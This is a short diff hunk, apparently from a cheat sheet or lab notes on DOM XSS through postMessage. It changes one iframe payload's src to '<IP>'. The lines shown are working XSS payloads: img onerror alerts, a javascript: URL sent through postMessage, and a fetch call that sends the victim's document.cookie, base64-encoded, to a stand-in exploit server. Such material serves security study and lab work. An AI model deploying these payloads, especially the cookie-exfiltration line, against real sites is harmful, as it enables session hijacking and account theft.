@@ -254,7 +254,7 @@ window.postMessage('<img src=0 onerror=alert(1)>');
 onload='this.contentWindow.postMessage("javascript:alert(0)//https://google.com","*")'></iframe>
 
 
-<iframe src="https://<IP>/" onload="this.contentWindow.postMessage('<img src=0 onerror=alert(1)>', '*')"></iframe>
+<iframe src="<IP>" onload="this.contentWindow.postMessage('<img src=0 onerror=alert(1)>', '*')"></iframe>
 <iframe src="https://<IP>/" onload="this.contentWindow.postMessage('<img src=0 onerror=fetch(`https://EXPLOIT-SV>/?cookie=`+btoa(document.cookie))>', '*')"></iframe>
 ```
 
